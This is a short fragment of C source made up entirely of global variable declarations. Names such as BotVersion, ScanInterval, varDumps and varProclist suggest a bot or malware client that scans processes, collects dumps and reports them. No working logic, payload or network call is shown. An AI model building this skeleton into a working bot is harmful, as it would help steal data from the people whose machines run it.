...
BYTE *pHttpData = NULL;
BYTE Uniq[37] = {0};
BYTE BotVersion[20] = {0};

DWORD GrowSize = 0;
DWORD ScanInterval = 0;
DWORD ConnectInterval = 0;
DWORD CurPID = 0;
DWORD ParentPID = 0;
DWORD ChildPID = 0;
...
HANDLE hHeap = NULL;
HANDLE hThreadRegistry = NULL;
HANDLE hThreadChild = NULL;
HANDLE hThreadScan = NULL;
HANDLE hCacheMapping = NULL;
HANDLE hInteractEvent = NULL;
HANDLE hConnectEvent = NULL;

CRITICAL_SECTION crsReportFlag;
CRITICAL_SECTION crsBlob;

WCHAR OldLocation[MAX_PATH] = {0};
WCHAR CurrentLocation[MAX_PATH] = {0};
WCHAR wUniq[37] = {0};
WCHAR IEPath[MAX_PATH] = {0};

char Key[5] = {0};
char EncodedKey[10] = {0};

const int fullVarSize = sizeof(varUID) + sizeof(varDumps) + sizeof(varIdle) + sizeof(varUsername)
...
const int runtimeVarSize = sizeof(varUID) + sizeof(varDumps) + sizeof(varIdle) + sizeof(varProclist)
						  + sizeof(varKey) + sizeof(Key) + sizeof(varVersion) + sizeof(BotVersion);

__GetLastInputInfo _GetLastInputInfo = NULL;
mIsWoW64Process IsWoW64ProcessX = NULL;
